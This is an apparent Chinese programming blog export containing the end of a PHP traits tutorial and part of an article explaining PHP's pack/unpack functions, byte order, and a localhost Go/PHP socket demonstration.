<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> A &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smallTalk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'a'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bigTalk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'A'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> B &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smallTalk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'b'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">bigTalk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'B'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Talker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">A</span>, <span class="title">B</span> &#123;</span><br><span class="line">        <span class="title">B</span>::<span class="title">smallTalk</span> <span class="title">insteadof</span> <span class="title">A</span>;</span><br><span class="line">        A::bigTalk <span class="keyword">insteadof</span> B;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Aliased_Talker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">A</span>, <span class="title">B</span> &#123;</span><br><span class="line">        <span class="title">B</span>::<span class="title">smallTalk</span> <span class="title">insteadof</span> <span class="title">A</span>;</span><br><span class="line">        A::bigTalk <span class="keyword">insteadof</span> B;</span><br><span class="line">        B::bigTalk <span class="keyword">as</span> talk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Note:</span><br><span class="line"></span><br><span class="line">在 PHP 7.0 之前，在类里定义和 trait 同名的属性，哪怕是完全兼容的也会抛出 E_STRICT（完全兼容的意思：具有相同的访问可见性、初始默认值）。</span><br></pre></td></tr></table></figure>

<h2 id="修改方法的访问控制"><a href="#修改方法的访问控制" class="headerlink" title="修改方法的访问控制"></a>修改方法的访问控制</h2><p>使用 as 语法还可以用来调整方法的访问控制。</p>
<h3 id="Example-6-修改方法的访问控制"><a href="#Example-6-修改方法的访问控制" class="headerlink" title="Example #6 修改方法的访问控制"></a>Example #6 修改方法的访问控制</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> HelloWorld &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello World!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 sayHello 的访问控制</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HelloWorld</span> &#123; <span class="title">sayHello</span> <span class="title">as</span> <span class="title">protected</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 给方法一个改变了访问控制的别名</span></span><br><span class="line"><span class="comment">// 原版 sayHello 的访问控制则没有发生变化</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HelloWorld</span> &#123; <span class="title">sayHello</span> <span class="title">as</span> <span class="title">private</span> <span class="title">myPrivateHello</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="从-trait-来组成-trait"><a href="#从-trait-来组成-trait" class="headerlink" title="从 trait 来组成 trait"></a>从 trait 来组成 trait</h2><p>正如 class 能够使用 trait 一样，其它 trait 也能够使用 trait。在 trait 定义时通过使用一个或多个 trait，能够组合其它 trait 中的部分或全部成员。</p>
<h3 id="Example-7-从-trait-来组成-trait"><a href="#Example-7-从-trait-来组成-trait" class="headerlink" title="Example #7 从 trait 来组成 trait"></a>Example #7 从 trait 来组成 trait</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> Hello &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> World &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> HelloWorld &#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Hello</span>, <span class="title">World</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HelloWorld</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line">$o-&gt;sayWorld();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<pre><code>Hello World!</code></pre><h2 id="Trait-的抽象成员"><a href="#Trait-的抽象成员" class="headerlink" title="Trait 的抽象成员"></a>Trait 的抽象成员</h2><p>为了对使用的类施加强制要求，trait 支持抽象方法的使用。</p>
<h3 id="Example-8-表示通过抽象方法来进行强制要求"><a href="#Example-8-表示通过抽象方法来进行强制要求" class="headerlink" title="Example #8 表示通过抽象方法来进行强制要求"></a>Example #8 表示通过抽象方法来进行强制要求</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> Hello &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHelloWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello'</span>.<span class="keyword">$this</span>-&gt;getWorld();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getWorld</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $world;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Hello</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;world;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setWorld</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;world = $val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Trait-的静态成员"><a href="#Trait-的静态成员" class="headerlink" title="Trait 的静态成员"></a>Trait 的静态成员</h2><p>Traits 可以被静态成员静态方法定义。</p>
<h3 id="Example-9-静态变量"><a href="#Example-9-静态变量" class="headerlink" title="Example #9 静态变量"></a>Example #9 静态变量</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> Counter &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">inc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $c = <span class="number">0</span>;</span><br><span class="line">        $c = $c + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$c\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Counter</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Counter</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> C1(); $o-&gt;inc(); <span class="comment">// echo 1</span></span><br><span class="line">$p = <span class="keyword">new</span> C2(); $p-&gt;inc(); <span class="comment">// echo 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Example-10-静态方法"><a href="#Example-10-静态方法" class="headerlink" title="Example #10 静态方法"></a>Example #10 静态方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> StaticExample &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">doSomething</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Doing something'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">StaticExample</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">Example::doSomething();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>Trait 同样可以定义属性。</p>
<h3 id="Example-11-定义属性"><a href="#Example-11-定义属性" class="headerlink" title="Example #11 定义属性"></a>Example #11 定义属性</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> PropertiesTrait &#123;</span><br><span class="line">    <span class="keyword">public</span> $x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PropertiesExample</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">PropertiesTrait</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$example = <span class="keyword">new</span> PropertiesExample;</span><br><span class="line">$example-&gt;x;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Trait 定义了一个属性后，类就不能定义同样名称的属性，否则会产生 fatal error。 有种情况例外：属性是兼容的（同样的访问可见度、初始默认值）。 在 PHP 7.0 之前，属性是兼容的，则会有 E_STRICT 的提醒。</p>
<h3 id="Example-12-解决冲突"><a href="#Example-12-解决冲突" class="headerlink" title="Example #12 解决冲突"></a>Example #12 解决冲突</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> PropertiesTrait &#123;</span><br><span class="line">    <span class="keyword">public</span> $same = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">public</span> $different = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PropertiesExample</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">PropertiesTrait</span>;</span><br><span class="line">    <span class="keyword">public</span> $same = <span class="keyword">true</span>; <span class="comment">// PHP 7.0.0 后没问题，之前版本是 E_STRICT 提醒</span></span><br><span class="line">    <span class="keyword">public</span> $different = <span class="keyword">true</span>; <span class="comment">// 致命错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>pack函数分析</title>
    <url>/articles/pack%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>本文介绍的是通过二进制数据包的方式通信，演示语言为PHP和Golang。PHP提供了pack/unpack函数来进行二进制打包和二进制解包。在具体讲解之前，我们先来了解一些基础知识。</p>
<h4 id="什么是字节序"><a href="#什么是字节序" class="headerlink" title="什么是字节序"></a>什么是字节序</h4><p>在不同的计算机体系结构中，对于数据(比特、字节、字)等的存储和传输机制有所不同，因而引发了计算机领域中一个潜在但是又很重要的问题，即通信双方交流的信息单元应该以什么样的顺序进行传送。如果达不成一致的规则，计算机的通信与存储将会无法进行。目前在各种体系的计算机中通常采用的字节存储机制主要有两种：大端(Big-endian)和小端(Little-endian)。这里所说的大端和小端即是字节序。</p>
<h5 id="MSB和LSB"><a href="#MSB和LSB" class="headerlink" title="MSB和LSB"></a>MSB和LSB</h5><ul>
<li><p>MSB是Most Significant Bit/Byte的首字母缩写，通常译为最重要的位或最重要的字节。它通常用来表示在一个bit序列(如一个byte是8个bit组成的一个序列)或一个byte序列(如word是两个byte组成的一个序列)中对整个序列取值影响最大的那个bit/byte。</p>
</li>
<li><p>LSB是Least Significant Bit/Byte的首字母缩写，通常译为最不重要的位或最不重要的字节。它通常用来表明在一个bit序列(如一个byte是8个bit组成的一个序列)或一个byte序列(如word是两个byte组成的一个序列)中对整个序列取值影响最小的那个bit/byte。</p>
</li>
<li><p>对于一个十六进制int类型整数0x12345678来说，0x12就是MSB，0x78就是LSB。而对于0x78这个字节而言，它的二进制是01111000，那么最左边的那个0就是MSB，最右边的那个0就是LSB。</p>
</li>
</ul>
<h5 id="大端序"><a href="#大端序" class="headerlink" title="大端序"></a>大端序</h5><ul>
<li>大端序又叫网络字节序。大端序规定高位字节在存储时放在低地址上，在传输时高位字节放在流的开始；低位字节在存储时放在高地址上，在传输时低位字节放在流的末尾。</li>
</ul>
<h5 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h5><ul>
<li>小端序规定高位字节在存储时放在高地址上，在传输时高位字节放在流的末尾；低位字节在存储时放在低地址上，在传输时低位字节放在流的开始。</li>
</ul>
<h5 id="网络字节序"><a href="#网络字节序" class="headerlink" title="网络字节序"></a>网络字节序</h5><ul>
<li>网络字节序是指大端序。TCP/IP都是采用网络字节序的方式，java也是使用大端序方式存储。</li>
</ul>
<h5 id="主机字节序"><a href="#主机字节序" class="headerlink" title="主机字节序"></a>主机字节序</h5><ul>
<li><p>主机字节序代表本机的字节序。一般是小端序，但也有一些是大端序。  </p>
</li>
<li><p>主机字节序用在协议描述中则是指小端序。  </p>
</li>
</ul>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote>
<p>字节序只针对于多字节类型的数据。比如对于int类型整数0x12345678，它占有4个字节的存储空间，存储方式有大端(0x12, 0x34, 0x56, 0x78)和小端(0x78, 0x56, 0x34, 0x12)两种。可以看到，在大端或小端的存储方式中，是以字节为单位的。所以对于单字节类型的数据，不存在字节序这个说法。</p>
</blockquote>
<h4 id="pack-unpack详解"><a href="#pack-unpack详解" class="headerlink" title="pack/unpack详解"></a>pack/unpack详解</h4><p>PHP pack函数用于将其它进制的数字压缩到位字符串之中。也就是把其它进制数字转化为ASCII码字符串。</p>
<p><img src="/articles/pack函数分析/192402_Yzg7_182025.jpg" alt="pack() format characters"></p>
<h5 id="格式字符翻译"><a href="#格式字符翻译" class="headerlink" title="格式字符翻译"></a>格式字符翻译</h5><table>
<thead>
<tr>
<th align="left">代码</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">a</td>
<td align="left">将字符串空白以 NULL 字符填满</td>
</tr>
<tr>
<td align="left">A</td>
<td align="left">将字符串空白以 SPACE 字符 (空格) 填满</td>
</tr>
<tr>
<td align="left">h</td>
<td align="left">16进制字符串，低位在前以半字节为单位</td>
</tr>
<tr>
<td align="left">H</td>
<td align="left">16进制字符串，高位在前以半字节为单位</td>
</tr>
<tr>
<td align="left">c</td>
<td align="left">有符号字符</td>
</tr>
<tr>
<td align="left">C</td>
<td align="left">无符号字符</td>
</tr>
<tr>
<td align="left">s</td>
<td align="left">有符号短整数 (16位，主机字节序)</td>
</tr>
<tr>
<td align="left">S</td>
<td align="left">无符号短整数 (16位，主机字节序)</td>
</tr>
<tr>
<td align="left">n</td>
<td align="left">无符号短整数 (16位, 大端字节序)</td>
</tr>
<tr>
<td align="left">v</td>
<td align="left">无符号短整数 (16位, 小端字节序)</td>
</tr>
<tr>
<td align="left">i</td>
<td align="left">有符号整数 (依赖机器大小及字节序)</td>
</tr>
<tr>
<td align="left">I</td>
<td align="left">无符号整数 (依赖机器大小及字节序)</td>
</tr>
<tr>
<td align="left">l</td>
<td align="left">有符号长整数 (32位，主机字节序)</td>
</tr>
<tr>
<td align="left">L</td>
<td align="left">无符号长整数 (32位，主机字节序)</td>
</tr>
<tr>
<td align="left">N</td>
<td align="left">无符号长整数 (32位, 大端字节序)</td>
</tr>
<tr>
<td align="left">V</td>
<td align="left">无符号长整数 (32位, 小端字节序)</td>
</tr>
<tr>
<td align="left">f</td>
<td align="left">单精度浮点数 (依计算机的范围)</td>
</tr>
<tr>
<td align="left">d</td>
<td align="left">双精度浮点数 (依计算机的范围)</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">空字节</td>
</tr>
<tr>
<td align="left">X</td>
<td align="left">倒回一位</td>
</tr>
<tr>
<td align="left">@</td>
<td align="left">填入 NULL 字符到绝对位置</td>
</tr>
</tbody></table>
<h5 id="格式字符详解"><a href="#格式字符详解" class="headerlink" title="格式字符详解"></a>格式字符详解</h5><ul>
<li><p>pack/unpack允许使用修饰符-和数字，紧跟在格式字符之后，用于指定该格式的个数；</p>
</li>
<li><p>a和A都是用来打包字符串的，它们的唯一区别就是当小于定长时的填充方式。a以NULL填充，NULL事实上是’\0’的表示，代表空字节，8个位上全是0。A以空格填充，空格也即ASCII码为32的字符。这里有一个关于填充的使用场景的例子：请求登录的数据包规定用户名不超过20个字节，密码经过md5加密后是固定的32个字节。用户名就是变长的，为了便于服务器端读取和处理，通常会填充成定长。当然，这只是使用的方式之一，事实上还可以用变长的方式传递数据包，但这不在本文的探讨范围内。字符串有一点麻烦的是编码问题，尤其是在跟不同的平台通信时更为突出。比如在用pack进行打包字符串时，事实上是将字符内部的编码打包进去。单字节字符就没有问题，因为单字节在所有平台上都是一致的。</p>
</li>
</ul>
<p>来看个例子(pack.php)：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$bin = pack(<span class="string">"a"</span>, <span class="string">"d"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . $bin . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: 0x"</span> . bin2hex($bin) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.phpoutput: d</span><br><span class="line">output: 0x64</span><br></pre></td></tr></table></figure>

<p>$bin是返回的二进制字符，你可以直接输出它，PHP知道如何处理。通过bin2hex方法将$bin转换成十六进制可以知道，十六进制0x64表示的是字符d。对于中文字符(多字节字符)来说，通常有GBK编码、BIG5编码以及UTF8编码等。比如在GBK编码中，一个中文字符采用2个字节来表示；在UTF8编码中，一个中文字符采用3个字节来表示。这通常需要协商采用统一的编码，否则会由于内部的表示不一致导致无法处理。在PHP中只要将文件保存为特定的编码格即可，其它语言可能跟操作系统相关，因此或许需要编码转换。本文的例子一概基于UTF8编码。</p>
<p>继续来看个例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$bin = pack(<span class="string">"a3"</span>, <span class="string">"中"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: 0x"</span> . bin2hex($bin) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . chr(<span class="number">0xe4</span>) . chr(<span class="number">0xb8</span>) . chr(<span class="number">0xad</span>) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . $bin&#123;<span class="number">0</span>&#125; . $bin&#123;<span class="number">1</span>&#125; . $bin&#123;<span class="number">2</span>&#125; . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: 0xe4b8ad</span><br><span class="line">output: 中</span><br><span class="line">output: 中</span><br></pre></td></tr></table></figure>


<p>你可能会觉得很奇怪，后面2个输出是一样的。ASCII码表示单字节字符(其中包括英文字母、数字、英文标点符号、不可见字符以及控制字符等等)，它总是小于0x80，即小于十进制的128。当在处理字符时，如果字节小于0x80，则把它当作单字节来处理，否则会继续读取下一个字节，这通常跟编码有关，GBK会将2个字节当成一个字符来处理，UTF8则需要3个字节。有时候在PHP中需要做类似的处理，比如计算字符串中字符的个数(字符串可能包含单字节和多字节)，strlen方法只能计算字节数，而mb_strlen需要开启扩展。类似这样的需求，其实很容易处理：  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mbstrlen</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $len = strlen($str);</span><br><span class="line">    <span class="keyword">if</span> ($len &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $count++;</span><br><span class="line">        <span class="keyword">if</span> (ord($str&#123;$i&#125;) &gt;= <span class="number">0x80</span>) &#123;</span><br><span class="line">            $i+= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . mbstrlen(<span class="string">"中国so强大！"</span>) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: 7</span><br></pre></td></tr></table></figure>

<p>以上代码的实现就是利用单字节字符的ASCII码小于0x80。至于要跳过几个字节，这要看具体是什么编码。接下来通过例子来看看a和A的区别：</p>
<p>main.go的源码(只是用于测试，没有考虑细节)：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"net"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">const</span> BUF_SIZE = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleConnection</span><span class="params">(conn net.Conn)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> conn.Close()</span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, BUF_SIZE)</span><br><span class="line">    n, err := conn.Read(buf)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"err: %v\n"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(<span class="string">"\n已接收：%d个字节，数据是：'%s'\n"</span>, n, <span class="keyword">string</span>(buf))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ln, err := net.Listen(<span class="string">"tcp"</span>, <span class="string">":9872"</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">"error: %v\n"</span>, err)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        conn, err := ln.Accept()</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">           <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">go</span> handleConnection(conn)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\$ cd $GOPATH/src/pack/_test</span><br><span class="line">\$ go build</span><br><span class="line">\$ ./pack/_test</span><br></pre></td></tr></table></figure>


<p>代码很简单，收到数据，然后输出。  </p>
<p>pack.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$host = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$port = <span class="string">"9872"</span>;</span><br><span class="line">$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to create socket\n"</span>);</span><br><span class="line">@socket_connect($socket, $host, $port) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Connect error.\n"</span>);</span><br><span class="line"><span class="keyword">if</span> ($err = socket_last_error($socket)) &#123;</span><br><span class="line">    socket_close($socket);</span><br><span class="line">    <span class="keyword">die</span>(socket_strerror($err) . <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$binarydata = pack(<span class="string">"a20"</span>, <span class="string">"中国强大"</span>);</span><br><span class="line">$len = socket_write($socket, $binarydata, strlen($binarydata));</span><br><span class="line">socket_close($socket);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: 已接收：20个字节，数据是：&apos;中国强大&apos;</span><br></pre></td></tr></table></figure>

<p>以上的输出中，单引号不是数据的一部分，只是为了便于观察。很明显，我们打包的字符串只占12字节， a20 表示 20 个 a，你当然可以连续写 20 个a，但我想你不会这么傻。如果是 a- 的话，则表示任意多个a。通过服务器端的输出来看，PHP发送了20个字节过去，服务器端也接收了20个字节，但因为填充的 \0 是空字符，所以你不会看到有什么不一样的地方。现在我们将 a20 换成 A20 ，代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$host = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$port = <span class="string">"9872"</span>;</span><br><span class="line">$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to create socket\n"</span>);</span><br><span class="line">@socket_connect($socket, $host, $port) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Connect error.\n"</span>);</span><br><span class="line"><span class="keyword">if</span> ($err = socket_last_error($socket)) &#123;</span><br><span class="line">    socket_close($socket);</span><br><span class="line">    <span class="keyword">die</span>(socket_strerror($err) . <span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$binarydata = pack(<span class="string">"A20"</span>, <span class="string">"中国强大"</span>);</span><br><span class="line">$len = socket_write($socket, $binarydata, strlen($binarydata));</span><br><span class="line">socket_close($socket);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: 已接收：20个字节，数据是：&apos;中国强大        &apos;</span><br></pre></td></tr></table></figure>

<p>是的，空格存在于数据中。这就是a和A的区别。</p>
<ul>
<li>h和H的描述看起来有些奇怪。它们都是读取十进制，以十六进制方式读取，以半字节(4位)为单位。这听起来有些拗口，还是以实例来说明：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"output: "</span> . pack(<span class="string">"H"</span>, <span class="number">0x5</span>) . <span class="string">"\n"</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ php -f pack.php</span><br><span class="line">output: P</span><br></pre></td></tr></table></figure>

